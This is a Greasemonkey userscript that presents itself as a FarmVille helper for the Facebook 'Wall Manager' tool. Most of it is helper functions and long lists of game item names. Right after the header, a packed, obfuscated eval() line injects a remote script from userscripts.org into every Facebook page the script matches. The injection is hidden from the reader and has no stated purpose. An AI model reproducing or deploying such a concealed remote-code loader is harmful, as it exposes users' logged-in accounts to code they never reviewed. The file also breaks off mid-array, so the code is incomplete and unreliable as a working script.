// ==UserScript==
// @name           Wall Manager Sidekick Plus (FV) 
// @description    Assists Wall Manager with Farm Ville posts
// @include        /(^http(s)?:\/\/(apps\.facebook\.com\/onthefarm\/|(.*)\.farmville\.com))/
// @include        http*://www.facebook.com/plugins/serverfbml.php
// @include        http://www.facebook.com/pages/FB-Wall-Manager/*
// @include        /https?:\/\/www\.facebook\.com\/dialog\/apprequests\?(.*)
// @include		   http://www.facebook.com/*
// @include		   https://www.facebook.com/*(app_id=102452128776)(.*)/
// @exclude        /(suggestionhub|neighbors)(\.php)?/
// @exclude        http*farmville.com/flash.php?*
// @license        http://creativecommons.org/licenses/by-nc-nd/3.0/us/
// @version        0.1.38
// @copyright      Charlie Ewing & Donald Mapes
// ==/UserScript== 
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))





(function() { 
	var version = "0.1.38";
	var thisApp = "102452128776";
	
	var defaultTO=null;

	function $(ID,root) {return (root||document).getElementById(ID);}

	String.prototype.startsWith = function(s) {return (this.match("^"+s)==s)};

	String.prototype.endsWith = function(s) {return (this.match(s+"$")==s)};

	String.prototype.find = function(s) {return (this.indexOf(s) != -1);};

	String.prototype.contains = function(s) {return (this.indexOf(s) != -1);};

	String.prototype.noSpaces = function(s) {return (this.replace(/\s+/g,''));};

	String.prototype.upperWords = function(s) {return (this+'').replace(/^(.)|\s(.)/g, function($1){return $1.toUpperCase();});};

	Array.prototype.swap = function (x,y) {var b = this[x];this[x] = this[y];this[y] = b;return this;};

	Array.prototype.pickRandom = function () {var i=Math.floor(Math.random()*this.length); return this[i];};

	Array.prototype.inArray = function(value) {for(var i=this.length-1; i>=0; i--) {if(this[i]==value) return true;} return false;};

	String.prototype.getUrlParam = function(s) {
		try{return this.split(s+"=")[1].split("&")[0];} catch(e){return "";}
	};

	//sorts an array in such a way as to prevent
	//finding pea before peanut, or pea before english pea, and then effectively swapping their order
	//now also finds ash in cashew and places ash after cashew
	Array.prototype.fixOrder = function(){
		if (this.length>1) for (var i=this.length-1;i>0;i--) {
			for (var i2=i-1;i2>0;i2--){
				if (this[i].toLowerCase().contains(this[i2].toLowerCase())){
					var b=this[i];
					this[i]=this[i2];
					this[i2]=b;
					b=null;
				}
			}
		}
		return this;
	};

	//reconstruct an array, turning it into definitions using a prefix
	Array.prototype.toDefinitions = function(prefix){
		if (this) for (var i=0;(this[i]);i++) this[i]=prefix+this[i].noSpaces().toLowerCase();
		return this;
	};


		//prevent reading data from top page because it does not contain useful information and can trick the sidekick
	if ((window.top==window.self) && !window.location.href.match( /(^http:\/\/www\.facebook\.com\/pages\/FB-Wall-Manager\/)/ )) {
	
		//add listener which will hot potato details back to WM if in https top document
		if (location==top.location) try {
			//alert("top document");
			if (location.href.startsWith("https:")) {
				//alert("https:");
				var hotPotatoTicker;
				hotPotatoTicker=setInterval(function(){try{
					var status="";
					if ((status=location.hash.getUrlParam("status"))!="") {
						clearInterval(hotPotatoTicker);
						location.href="http://apps.facebook.com/?#status="+status;
					}
				}catch(e){
					//alert("cannot pass details to alternate url");
				}},1000);
			}
		} catch (e){
			//alert("cannot interact with top document, assume this document is not the top document");
		}
		
		return;
	}

	//returns the merge of any number of JSON objects
	//pass JSON objects as comma separated parameters
	//var newJSON = mergeJSON(a,b,c...n)
	//note: overwrites preexisting entries from earlier passed objects
	function mergeJSON () {
		var ret = {};
		for (var a=0,len=arguments.length;a<len;a++) for (var v in arguments[a]) ret[v] = arguments[a][v];
      		return ret;
	};

	//short form for evaluate
	//returns a snapshot object
	function selectNodes(xPath,params){
		params=(params||{});
		return (params['doc']||document).evaluate(xPath,(params['node']||document),null,(params['type']||6),null);
	};

	//short form for evaluate with single node return
	//returns the actual node, not the snapshot
	function selectSingleNode(xPath,params){
		params=params||{}; params['type']=9;
		return selectNodes(xPath,params).singleNodeValue;
	};

	//clicks an object using the mouse
	//does not run default actions like opening links
	function click(e) {
		if(!e && typeof e=='string') e=document.getElementById(e);
		if(!e) return;
		var evObj = e.ownerDocument.createEvent('MouseEvents');
		evObj.initMouseEvent("click",true,true,e.ownerDocument.defaultView,0,0,0,0,0,false,false,false,false,0,null);
		e.dispatchEvent(evObj);
		e.className += " noHammer";
	};

	// Created by avg, modified by JoeSimmons. shortcut to create an element
	function createElement(a,b,c) {
		if(a=="text") {return document.createTextNode(b);}
		var ret=document.createElement(a.toLowerCase());
		if(b) for(var prop in b) if(prop.indexOf("on")==0) ret.addEventListener(prop.substring(2),b[prop],false);
		else if(",style,accesskey,id,name,src,href,which,rel,action,method,value,data-ft".indexOf(","+prop.toLowerCase())!=-1) ret.setAttribute(prop.toLowerCase(), b[prop]);
		else ret[prop]=b[prop];
		if(c) c.forEach(function(e) { ret.appendChild(e); });
		return ret;
	};

	//sidekick ability to pass information via hash parameter
	function sendMessage(s,hwnd){
		hwnd = (hwnd || window.top);
		//alert(s);
		try {
			hwnd.location.hash = s;
		} catch (e) {
			hwnd.location.href = "http://apps.facebook.com/?#"+s;	
		}
	};

	//use this array to replace texts for purposely screwed up test texts below
	//this allows to search correctly yet not display stuff wrong in recognition
	//or in the options menu when using quick arrays and the createMenuFromArray function below
	//keep all the text here in lowercase
	var screwyTexts = {"purple popp":"purple poppy","orange dais":"orange daisy","electric lil":"electric lily","daylil":"daylily",
		"golden popp":"golden poppy","chrome dais":"chrome daisy","sun popp":"sun poppy","lucky penn":"lucky penny",
		"school supp":"school supply","gold piece":"gold","real ca milk":"Real CA Milk","cornucalfpia":"CornuCalfpia",
		"sugar pega":"sugar pegafoal","fall pega":"fall pegafoal","in hoodie":"calf in hoodie","in sweater":"calf in sweater",
		"silver pega":"silver pegacalf","cheerful scroogi":"cheerful scroogifoal","i heart ny apple":"I <3 NY Apple",
		"host pega":"host pegafoal","life of the party pega":"life of the party pegafoal","pegarudolphi":"pegarudolphifoal",
		"nypd":"NYPD","winter fun pega":"winter fun pegafoal","stay at home pega":"stay at home pegafoal",
		"traveling pega":"traveling pegafoal","valentine pega":"valentine pegafoal"};

	//set your properties for each NewItem array here
	//WM can make use of backgroundColor, foregroundColor, newitem:[true, 1, 2, or 3] and a css classname
	//current predefined css names include: newOpt, newOpt[1-3], underline, overline, unreleased, hidden, ghost, ended, green, red, blue
	//orange, yellow, silver, gray, white, black, box, and highlight
	//** I left this open so that if an item appears in more than one newItems array, then it will attempt to take on all the visual properties given for each group
	var newItemColors={
		unreleased:{backgroundColor:"#FF6600"}, //or css:"unreleased"
		items1:{backgroundColor:"green"}, //or css:"newOpt1"
		items2:{backgroundColor:"darkRed"}, //or css:"newOpt2"
		items3:{backgroundColor:"magenta"}, 
		items4:{backgroundColor:"purple"},
		items5:{backgroundColor:"royalBlue"}, //or css:"newOpt3"
	};
	
	//mark all these as new while building the menus
	//this collection of arrays is accessed directly by createmenufromarray so you dont need to pass it each time.
	var newItems={
		unreleased:[
			"mat_farmhandcenter",
			"scientificscale",
			"massagestone",
			"buffettray",
			"stamp",
			"ballofwool",
			"golddust",			
			"woodengiraffe",
			"woodentiger",
			"woodenzebra",
		],
		items1:[
			"bushel_ambrosiatulip",
			"bushel_boggartbulb",
			"bushel_butterflyrose",
			"bushel_darkdahlia",
			"bushel_dreamcotton",
			"bushel_elfintea",
			"bushel_fairyfoxglove",
			"bushel_goblinvine",
			"bushel_gossamerivy",
			"bushel_honeymelon",
			"bushel_nectarkin",
			"bushel_pixieberry",
			"tree_giantallium",
			"tree_giantamaryllis",
			"tree_giantbirdparadise",
			"tree_giantbluebirdparadise",
			"tree_giantbutterflyheart",
			"tree_giantdew",
			"tree_giantdryad",
			"tree_giantfairybubble",
			"tree_giantfairybutterfly",
			"tree_giantfairylantern",
			"tree_giantfairylight",
			"tree_giantfairyshoe",
			"tree_giantfairysnowflake",
			"tree_giantflower",
			"tree_giantgemii",
			"tree_giantgerbera",
			"tree_giantguardian",
			"tree_giantladybug",
			"tree_giantlargetulip",
			"tree_giantmintcandyconifer",
			"tree_giantmushroom",
			"tree_giantmysticalfire",
			"tree_giantpansy",
			"tree_giantpixiemaple",
			"tree_giantprismpine",
			"tree_giantrainbowleaf",
			"tree_giantraindrop",
			"tree_giantray",
			"tree_giantredrose",
			"tree_giantrose",
			"tree_giantsilverbark",
			"tree_giantsparkle",
			"tree_giantwhispy",
			"tree_giantyellowrose",
			"adopt_foalglen",
			"adopt_foalzephyr",
			"adopt_foalwinterelf",
			"adopt_foalsteamunicorn",
			"adopt_foalleaf",
			"adopt_foallilacfairy",
			"adopt_foaldew",
			"adopt_foalsky",
			"adopt_foalfestiveelf",
			"adopt_foalvalentinepega",
			"adopt_foalwaterpegacorn",
			"adopt_foalsolacorn",
			"adopt_foalshimmering",
			"adopt_foalraindrop",
			"adopt_foalgoblicorn",
			"adopt_foalfireflypegacorn",
			"adopt_foaldewpegacorn",
			"adopt_foalmonchinomonarch",
			"adopt_foallightning",
			"mat_enchantmentshop",
			"armillarysphere",
			"moongem",
			"sunlightrope",
			"mat_homemushroom",
			"fairydust",
			"magicmaple",
			"raindrop",
			"mat_rivermistfortress",
			"mithrilore",
			"starrock",
			"warpstone",
			"mat_trolltreasure",
			"vialofsunlight",
			"magicmushroom",
			"mat_glenaviary",
			"mat_glencowpasture",
			"mat_glenpaddock",
			"mat_glenlivestockpen",
			"mat_glenpetrun",
			"mat_glenwildlifecave",
			"mat_glenzoo",
			"mat_glengnomegarden",
		],
		items2:[
			"holidaypartystyle",
			"newyear'sresolutions",
			"egg_redsweater",
			"egg_floating",
			"egg_longjohn",
			"egg_partying",
			"bushel_rainbowsnowflake",
			"bushel_holidaybell",
			"bushel_holidaycookie",
			"bushel_holidaywreath",
			"bushel_fireworks",
			"bushel_bubbly",
			"bushel_fairywand",
			"bushel_balletqueenflower",
			"inandouthog",
			"alldayowl",
			"christmastoyshop",
			"trickstertoyshop",
			"holidaybakergnome",
			"jollysnowman",
			"laughingsnowman",
			"whoopiecushiongnome",
			"countdowncrowd",
			"quiettoast",
			"adopt_bashfulbunny",
			"adopt_slyrabbit",
			"adopt_hostpegacorn",
			"adopt_lifeofthepartypegacorn",
			"adopt_singleorderostrich",
			"adopt_horsemodern",
			"adopt_horsevintage",
			"adopt_partybear",
			"adopt_stylishtrich",
			"adopt_bulkorderostrich",
			"adopt_uglysweaterbear",
			"adopt_horsewrapped",
			"adopt_horsegiving",
			"adopt_cowcaroler",
			"adopt_cowjackfrost",
			"tree_bonsaiadenium",
			"tree_bonsaibeech",
			"tree_bonsaibrazilianrain",
			"tree_bonsaichristmas",
			"tree_bonsaichrysanthemum",
			"tree_bonsaiyarn",
			"tree_timesq.",
			"tree_balldrop",
			"tree_balloonanimals",
			"tree_fallingstreamers",
			"tree_mylarunicornballoon",
			"tree_noisemaker",
			"tree_starballoon",
			"tree_waterballoon",
			"tree_balletcake",
			"tree_crystalinetoadstool",
			"tree_curtaincall",
			"tree_glowingtulip",
			"tree_iheartnyapple",
			"tree_libertytorch",
			"tree_magicfeather",
			"tree_musicbox",
			"tree_pizzapie",
			"tree_purpleivy",
			"tree_radiocity",
			"tree_onsale",
			"tree_newarrival",
			"tree_spice",
			"tree_sugar",
			"tree_tinselmaple",
			"tree_loudnoisemaker",
			"tree_candlelight",
			"tree_coal",
			"tree_coupon",
			"tree_gadget",
			"tree_hanger",
			"tree_giantamericanbasswood",
			"tree_giantbarechristmas",
			"tree_giantbigbear",
			"tree_giantbook",
			"tree_giantbrooklynbridge",
			"tree_gianteasterncottonwood2",
			"tree_giantholidayhotchocolate",
			"tree_giantgreenyarn",
			"tree_gianticyflame",
			"tree_giantmetallicteacrabapple",
			"tree_giantnewyearhat",
			"tree_giantredyarn",
			"tree_giantsnowshoe",
			"tree_giantstrawnango",
			"tree_gianttangled",
			"tree_giantteacrabapple",
			"tree_gianttuttifrutti",
			"tree_giantcandlelight",
			"tree_giantcidercypress",
			"tree_giantcoal",
			"tree_giantdreidel",
			"tree_giantloudnoisemaker",
			"tree_giantnorthpole",
			"tree_giantpohutakawa",
			"tree_giantsnowflakemeadow",
			"tree_giantsobright",
			"tree_giantspice",
			"tree_giantsugar",
			"tree_gianttinselmaple",
			"tree_giantwintergharcod",
			"tree_giantwintersports",
			"adopt_calfballoon2",
			"adopt_calfcaroler",
			"adopt_calffireworks",
			"adopt_calfjackfrost",
			"adopt_calfmore2love",
			"adopt_calfnewyear2",
			"adopt_calfwallstreetbull",
			"adopt_calfcrystalsfairy",
			"adopt_calfgolightly",
			"adopt_calfgreensweater",
			"adopt_calfmeow",
			"adopt_calfmyfairlady",
			"adopt_foalsparklingbubbly",
			"adopt_foalchristmasmorning",
			"adopt_foalconfetti",
			"adopt_foalgiving",
			"adopt_foalballoonpegacorn",
			"adopt_foalhostpega",
			"adopt_foalhotcocoa",
			"adopt_foallifeofthepartypega",
			"adopt_foalpartypegacorn",
			"adopt_foalpeace",
			"adopt_foalpegarudolphi",
			"adopt_foalpinatapony",
			"adopt_foalpinkballoonpony",
			"adopt_foalrudolph",
			"adopt_foalfireworkunicorn",
			"adopt_foalmore2loveunicorn",
			"adopt_foalrudolphicorn",
			"adopt_foalwrapped",
			"adopt_foalballetinstructor",
			"adopt_foaluglysweaterbrumby",
			"adopt_foalholidayclydesdale",
			"adopt_foalfirstwise",
			"adopt_foalfrozenberry",
			"adopt_foalgraffiti",
			"adopt_foalnypd",
			"adopt_foalgemmaidenpegacorn",
			"adopt_foalpajamapegacorn",
			"adopt_foalroxeypegacorn",
			"adopt_foalswanlakepegacorn",
			"adopt_foalsweaterpegacorn",
			"adopt_foalwinterfunpega",
			"adopt_foalstayathomepega",
			"adopt_foaltravelingpega",
			"adopt_foallegwarmerspony",
			"adopt_foalsecondwise",
			"adopt_foalspotted",
			"adopt_foalthirdwise",
			"adopt_foalbohochicunicorn",
			"adopt_foalcosmopolitanunicorn",
			"adopt_foaldreamgirlunicorn",
			"adopt_foalflannel",
			"adopt_foalivyunicorn",
			"adopt_foalwinterfairycorn",
		],
		items3:[
			"mat_bloommasterybillboard",
			"purpleroller",
			"yellowpaper",
			"greentape",
			"shoppingpersonality",
			"mat_cheeryhouse",
			"mat_herbgarden",
			"mat_extinctanimalzoo",
			"brokenthermometer",
			"meteorite",
			"foodchain",
			"specialsoil",
			"peatpellet",
			"claypot",
			"mat_penguinskatepark",
			"corporatesponsor",	
			"icicleramp",
			"snowmachine",
			"mat_crystalgarden",
			"crystal",
			"crystalseed",
			"water",
			"tree_angel",
			"tree_hatbox",
			"tree_redlight",
			"tree_holidaycupcake",
			"tree_mintgumball",
			"tree_mixednut",
			"tree_vintagepatchwork",
			"tree_snowlights",
			"tree_toynut",
			"tree_beet",
			"tree_crownjewel",
			"tree_stbasil'scathedral",
			"tree_throne",
			"tree_chamomilecluster",
			"tree_scepter",
			"tree_christmaslist",
			"tree_igloo",
			"tree_iceberg",
			"tree_russianegg",
			"tree_royalcape",
			"tree_silverorange",
			"tree_gianticicle",
			"tree_gianttoy",
			"tree_giantholidayteddy",
			"tree_giantcoupon",
			"tree_giantdarkchristmas",
			"tree_giantbasicderby",
			"tree_giantbassderby",
			"tree_giantderbyboot",
			"tree_giantsalmonderby",
			"tree_gianttroutderby",
			"tree_giantfrozensnowfall",
			"tree_giantgadget",
			"tree_giantgiftcard",
			"tree_gianthanger",
			"tree_giantlightwire",
			"tree_giantlunarconifer",
			"tree_giantmeltinsnow",
			"tree_giantnewarrival",
			"tree_giantonsale",
			"tree_giantchristmaspast",
			"egg_chililight",
			"egg_promchick",
			"egg_spectator",
			"bulb_amaryllis",
			"bulb_anemone",
			"bulb_aster",
			"bulb_baby'sbreath",
			"bulb_black-eyedsusanvine",
			"bulb_casablancalily",
			"bushel_ambergrain",
			"bushel_amethystgrape",
			"bushel_cilantro",
			"bushel_criminimushroom",
			"bushel_deepdishcrust",
			"bushel_diamondcorn",
			"bushel_durumwheat",
			"bushel_emeraldmelon",
			"bushel_flatcrust",
			"bushel_frenchtarragon",
			"bushel_genovesebasil",
			"bushel_greenpepper",
			"bushel_marinarasauce",
			"bushel_marjoram",
			"bushel_moonstoneonion",
			"bushel_mushroomsauce",
			"bushel_oregano",
			"bushel_parsley",
			"bushel_pasta",
			"bushel_pearlpumpkin",
			"bushel_peridotpea",
			"bushel_pestosauce",
			"bushel_quartzcarrot",
			"bushel_redpepper",
			"bushel_romatomato",
			"bushel_rosemary",
			"bushel_rubyrose",
			"bushel_sapphireberry",
			"bushel_shiso",
			"bushel_shallot",
			"bushel_sorrel",
			"bushel_sundriedtomato",
			"bushel_thaibasil",
			"bushel_thyme",
			"bushel_whitewheat",
			"bushel_yellowonion",
			"bushel_snowman",
			"bushel_snowwoman",
			"bushel_christmastree",
			"adopt_calfangel",
			"adopt_calfchristmaspresent",
			"adopt_calfvintagedeco",
			"adopt_calfelf",
			"adopt_calfholidaylights",
			"adopt_calfpinecone",
			"adopt_calfsnowbattle",
			"adopt_calfspottedholiday",
			"adopt_calfcleopatra",
			"adopt_calffur",
			"adopt_calfhungryhungry",
			"adopt_calftoy",
			"adopt_calfuglysweater",
			"adopt_foaljoyful",
			"adopt_foalangel",
			"adopt_foalgift",
			"adopt_foalholidayexpress",
			"adopt_foalholidayparade",
			"adopt_foalhollymini",
			"adopt_foalmodern",
			"adopt_foalcheerfulscroogi",
			"adopt_foallightpegacorn",
			"adopt_foalgoldangelhorse",
			"adopt_foalicepixie",
			"adopt_foalclarapony",
			"adopt_foaldivapony",
			"adopt_foalexpress",
			"adopt_foalcheereweup",
			"adopt_foalstud",
			"adopt_foalpartytarpan",
			"adopt_foalflowercorn",
			"adopt_foalnutcrackerunicorn",
			"adopt_foalpoinsettiapegacorn",
			"adopt_foalsantaunicorn",
			"adopt_foalvintage",
			"adopt_foalfrostyclydesdale",
			"adopt_foalkingtut",
			"adopt_foalorlovtrotter2",
			"adopt_foalaurorapegacorn",
			"adopt_foalegyptianpegacorn",
			"adopt_foalglitterpegacorn",
			"adopt_foalnutcrackerpegacorn",
			"adopt_foalroyalpegacorn",
			"adopt_foalsnowpegacorn",
			"adopt_foaluglysweaterpegacorn",
			"adopt_foalpurpleiciclepegasus",
			"adopt_foalfrostypony",
			"adopt_foalroyalpony",
			"adopt_foalsleighride",
			"adopt_foaltapestry",
			"adopt_foaltoy",
			"adopt_foaluglysweater",
			"adopt_foalsnowflakeunicorn",
		],
		items4:[
			"mat_wishingfountain",
			"coppertube",
			"cutbamboo",
			"drillbit",
			"mysterybloom",
			"mysteryhorse",
			"mysterytree",
			"mat_holidaytreasure",
			"mat_holidayaviary",
			"mat_joyfulhorsepaddock",
			"mat_magicwildlifecave",
			"egg_strawberry",
			"bushel_chervil",
			"bushel_eveningflower",
			"adopt_calfabomidable",
			"adopt_calfcoco",
			"adopt_calfcostume",
			"adopt_calftruffle",
			"adopt_calfpepperybull",
			"adopt_calfcider",
			"adopt_calfglass",
			"adopt_calfkitchen",
			"adopt_calfsilverpega",
			"adopt_foalbluecandypegacorn",
			"adopt_foalcottoncandycorn",
			"adopt_foalexpedition",
			"adopt_foalgingerbread",
			"adopt_foalicediamond",
			"adopt_foalredwinepegacorn",
			"adopt_foalropelight",
			"adopt_foalturkey",
			"adopt_foalfrostycorn",
			"adopt_foalphoenixunicorn",
			"adopt_foalchef",
			"adopt_foalcider",
			"adopt_foalfigurine",
			"adopt_foalbutterflycorn",
			"adopt_foalcornpegacorn",
			"adopt_foalrainbowprism",
			"adopt_foalciderunicorn",
			"adopt_foalglassunicorn",
			"adopt_foalgrapeunicorn",
			"tree_metallicfir",
			"tree_europeansilverfir",
			"tree_frostybell",
			"tree_blackforest",
			"tree_cakepop",
			"tree_nutcake",
			"tree_woodenbutton",
			"tree_zipper",
			"tree_rainbowsnowflake",
			"tree_ropelight",
			"tree_snowman",
			"tree_sparklingsnowball",
			"tree_starlite",
			"tree_donut",
			"tree_swirlmint",
			"tree_rockcandy",
			"tree_feast",
			"tree_cinnamonroll",
			"tree_pumpkincake",
			"tree_cranjelly",
			"tree_sun",
			"tree_lampshade",
			"tree_marbles",
			"tree_giantamericanlarch",
			"tree_giantamericanlinden",
			"tree_giantamericansycamore",
			"tree_giantblackoak",
			"tree_gianteasterncottonwood",
			"tree_giantfallfeather",
			"tree_giantfrostedautumn",
			"tree_giantfrostfiremaple",
			"tree_giantjapanesestewartia",
			"tree_giantlacebarkelm",
			"tree_giantpersianparrotia",
			"tree_giantglassprism",
			"tree_giantrockelm",
			"tree_giantsmoothsumac",
			"tree_giantsycamoremaple",
			"tree_giantwhiteenkianthus",
			"tree_giantaraguaney",
			"tree_giantgoldenrain",
			"tree_giantdragonfruit",
			"tree_giantfalloak",
			"tree_giantfrozenfire",
			"tree_giantgharqad",
			"tree_giantmoretonbayfig",
			"tree_giantnutclock",
			"tree_gianttreeoflight",
		],
		items5:[
			"mat_bonsaigarden",
			"bonsaipedestal",
			"bonsaipot",
			"graftingtool",
			"tree_cube",
			"tree_embroidery",
			"tree_jacks",
			"tree_haircomb",
			"tree_paintbrush",
			"tree_pandatoy",
			"tree_pocketwatch",
			"tree_needle&thread",
			"tree_bonsaidogwood",
			"tree_bonsaifringe",
			"tree_bonsailantana",
			"tree_bonsaipowderpuff",
			"tree_bonsaihabanero",
			"tree_bonsaiamethyst",
			"tree_bonsaidelphinium",
			"tree_bonsaiforsythia",
			"tree_bonsaigrape",
			"tree_bonsaineea",
			"tree_bonsaiplum",
			"tree_bonsairainbowbutterfly",
			"tree_bonsairainbowchili",
			"tree_bonsairedribbon",
			"tree_bonsaistar",
			"tree_bonsaiwhitepine",
			"tree_giantafricanpear",
			"tree_giantautumnumbrella",
			"tree_giantblackdragon",
			"tree_giantcelery",
			"tree_giantdenim",
			"tree_giantsilverfir",
			"tree_giantfrenchfry",
			"tree_giantfrozenyogurt",
			"tree_gianthotpink",
			"tree_giantkite-eating",
			"tree_giantkumquat",
			"tree_giantmetallicfir",
			"tree_giantnuttyicecreamcone",
			"tree_giantparasolii",
			"tree_giantpawpaw",
			"tree_giantskyline",
			"tree_giantwoodenbutton",
			"tree_giantwutong",
			"tree_giantzipper",
			"adopt_calfaquarium",
			"adopt_calfcolonial",
			"adopt_calfblackholstein",
			"adopt_calfinhoodie",
			"adopt_calfinsweater",
			"adopt_calfblackox",
			"adopt_calfquilted",
			"adopt_calfragdoll",
			"adopt_foalboot",
			"adopt_foalnightcap",
			"adopt_foalbedazzledpegacorn",
			"adopt_foalcloudpegacorn",
			"adopt_foaldragonflypegacorn",
			"adopt_foalpumpkinpegacorn",
			"adopt_foalrobotpegacorn",
			"adopt_foalrainbowpegapony",
			"adopt_foalsaddlebred",
			"adopt_foalsneaker",
			"adopt_foaltin",
			"adopt_foalorangebutterflycorn",
			"adopt_foalleopardunicorn",
			"adopt_foalpurplenightcorn",
			"adopt_foalsilverunicorn",
			"adopt_foalskylineunicorn",
			"adopt_foalpurplestarunicorn",
			"egg_coruroy",
			"egg_farmer",
			"egg_giantjersey",
			"egg_egginjeans",
			"adopt_batpegacorn",
			"adopt_butterflypegacorn",
			"adopt_moonpegasus",
			"adopt_sunpegasus",
			"adopt_whitekodiakcub",
			"adopt_babywhitepenguin",
			"adopt_babywinterseal",
			"adopt_babyllama",
			"bushel_pinkokra",
			"bulb_blackberrylily",
			"bulb_forgetmenot",
			"bulb_sweetpea",
			"bulb_narcissus",
			"bulb_orangemums",
			"bulb_purple-ranunculus",
		]
	};

	//build a menu list based on an array of text
	//add a prefix to the return word using prefix
	//automatically sorts alphabetically, set sort=false to disable
	//automatically capitalizes first letter of every word
	//point markAsNew to your collection of new items or leave blank
	//point markWithColors to your color collection or leave blank
	function createMenuFromArray(arr,prefix,sort,markAsNew,markWithColors){
		markAsNew=markAsNew||newItems;
		markWithColors=markWithColors||newItemColors;
		sort=(sort==null)?true:sort;
		var ret={};
		if (arr) {
			//clone the array before sorting
			arr2=arr.slice(0);
			if (sort) arr2=arr2.sort();
			for (var i=0,len=arr2.length;i<len;i++){
				//build the real keyname
				var keyName = (prefix||'')+arr2[i].noSpaces().toLowerCase();
				//fix its label if needed
				var fixedLabel=screwyTexts[arr2[i].toLowerCase()];
				//create the element constructing code
				ret[keyName]={type:'checkbox',label:(fixedLabel || arr2[i]).upperWords()};
				
				//mark new and stylize
				for (var colorGroup in markAsNew) {
					if (markAsNew[colorGroup].inArray(keyName)) {
						//item found listed under colorGroup
						for (var newProp in markWithColors[colorGroup]) {
							//push properties to this element
							ret[keyName][newProp]=markWithColors[colorGroup][newProp];
							//console.log(markWithColors[colorGroup][newProp]);
						}					
					}
				}
			}
			arr2=null;
		}
		return ret;
	};
	
	//build Accept Text object from an array
	//add a prefix to the return key using keyPrefix, ie "cow_"
	//add a suffix to the return value using textSuffix, id " Cow"	
	function createAccTextFromArray(arr,keyPrefix,textSuffix){
		var ret={};
		if (arr) {
			for (var i=0,len=arr.length;i<len;i++){
				ret[(keyPrefix||'')+arr[i].noSpaces().toLowerCase()]=arr[i].upperWords()+(textSuffix||'');
			}
		}
		return ret;
	};


	//try to dock with WM 1.5 main script
	function dock(){
		//check that dock exists
		var door=$('wmDock');
		if (!door) {
			//cannot find dock
			window.setTimeout(dock, 1000);
			return;
		} 

		//check that the dock does not not already have us listed
		var doorMark=$('wmDoor_app'+thisApp);
		if (doorMark) return; //already posted to door


		//define types here
		//provide text as it appears in the post body/link, even if spelled wrong (ie. cirtus = citrus for FV collection items)
		//search texts do not need to be in proper case as the search engine in WM 1.5 sets everything to lowercase anyway
		//you cannot search for specific case text via a WM sidekick
		//texts are case corrected later when they are added to the options menu
		//add text entires in any order and use .fixOrder() to make sure order does not cause issues during searching


		//bushel types are grouped as they were in FVWM	
		//types are defined in separate arrays for easier use in options menu	

		var fruitTypes=["bell pepper","blackberry","blueberry","fire pepper","chardonnay","chinese eggplant","goji berry",
				"ghost chili","grape","jalapeno","leek","sichuan pepper","hilo pineapple","purple tomato","raspberry",
				"square melon","straspberry","strawberry","tomato","watermelon","white grape","yellow melon","zinfandel",
				"darrow blackberry","chandler blueberry","cove cranberry","red iceberry","frozen grapes","love strawberry",
				"sangiovese","cabernet sauvignon","syrah","pinot noir","riesling","moscato","sauvignon blanc","pineapple",
				"lilikoi","royal cantaloupe","cantaloupe","pepper","forbidden eggplant","african eggplant","red currant",
				"eggplant","elderberry","cranberry","flame pepper",
			].fixOrder();
				
		var vegTypes=["acorn squash","royal artichoke","asparagus","broccoli","red cabbage","cara potato","carnival squash",
				"baby carrot","chickpea","cucumber","english pea","field bean","heirloom carrot","long onion","green onion",
				"pea","potato","black pumpkin","purple asparagus","purple pod pea","radish","red spinach","rhubarb","spinach",
				"soybean","squash","squmpkin","turnip","zucchini","rappi","swiss chard","kennebec potato","pattypan",
				"butter & sugar corn","cauliflower","candied yam","carrotcicle","iceberg lettuce","kelp","royal taro",
				"taro","nagaimo","edamame","chinese daikon","bok choy","azuki","water chestnut","yam","forbidden onion",
				"artichoke","forbidden daikon","daikon","forbidden chestnut","swiss chard","onion","baby corn","parsnip",
				"garlic","pink okra","snap pea","carrot","lettuce","celery","brussel sprout","green bean","bean sprout",
				"forbidden sprouts","forbidden carrot","lentil","kidney bean","kale","dumpling squash","pumpkin","cabbage",
				"okra",
			].fixOrder();
				
		var grainTypes=["amaranth","barley","corn","double grain","hops","oat","posole corn","red wheat","royal hops",
				"rye","wheat","whisky peat","triticale","iced rice","sticky rice","imperial rice","millet","forbidden barley",
				"pearl barley","brown rice","jasmine rice","rice","buckwheat","sorghum",
			].fixOrder();
				
		var otherBushels=["aloe vera","jade bamboo","basil","black tea","kona coffee","chinese cotton","lowland ginger",
				"green tea","lemon balm","peppermint","golden sugar cane","hay","dill","tarragon","holly","forbidden tea",
				"gummi bear","mint candy","hawaiian ginger","wasabi","saba","ramen","lemongrass","gingerbread","imperial tea",
				"white cloud tea","jade peanut","royal mustard","red nori","sugar cane","mustard","ginger","cotton","coffee",
				"peanut","bamboo","sesame","horseradish","water cress","nori","forbidden ginseng","ginseng","forbidden udon",
				"udon","lollipop","bugleweed","vuvuzela","trumpet creeper","viola","lyre leaved sage","chervil",
				
				//might sort these eventually
				"amber grain","amethyst grape","cilantro","crimini mushroom","deep dish crust","diamond corn","durum wheat",
				"emerald melon","flat crust","french tarragon","genovese basil","green pepper","marinara sauce","marjoram",
				"moonstone onion","mushroom sauce","oregano","parsley","pasta","pearl pumpkin","peridot pea","pesto sauce",
				"quartz carrot","red pepper","roma tomato","rosemary","ruby rose","sapphire berry","shiso","shallot","sorrel",
				"sundried tomato","thai basil","thyme","white wheat","yellow onion","snowman","snow woman","christmas tree",
				"rainbow snowflake","holiday bell","holiday cookie","holiday wreath","fireworks","bubbly","fairy wand",
				"ballet queen flower",
			].fixOrder();
				
		var specialBushels=["birthday cake","crystal","cupid corn","snow cone","white pumpkin","candy cane","balloon","gnome",
				"red toadstool","purple toadstool","jack o lantern","green peppermint","snow carnation","king cake","rainbow",
				"candy corn","cereses carrot","capri-corn","moon flower","mercury melon","aquarius arugala","aries azalea",
				"venus fly trap","jupiter juniperus","apollo aster","celestial camellia","orange cauliflower","floating flower",
			].fixOrder();
				
		var flowerTypes=["red tulip","purple popp","morning glory","pink rose","white rose","orange dais","electric lil",
				"pink carnation","fire & ice rose","flamingo flower","yellow rose","pink hibiscus","green hellebore","alpine rose",
